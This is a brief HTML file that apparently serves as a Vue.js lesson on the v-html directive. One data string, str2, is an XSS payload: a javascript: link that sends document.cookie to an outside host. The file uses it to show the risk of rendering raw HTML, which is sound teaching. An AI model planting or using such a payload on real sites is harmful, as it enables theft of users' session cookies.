<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>v-html</title>
  <script src="../js/vue.js"></script>
</head>

<body>
  <div id="root">
    <h2>{{ name }}</h2>
    <h2 v-html="str"></h2>
    <h3 v-html="str2"></h3>
  </div>
  <script>
    Vue.config.productionTip = false
    new Vue({
      el:"#root",
      data:{
        name:'Vuecess',
        str:'<h3>Hello!</h3>',
        str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>资源Resource</a>'
      }
    })
  </script>
</body>

</html>
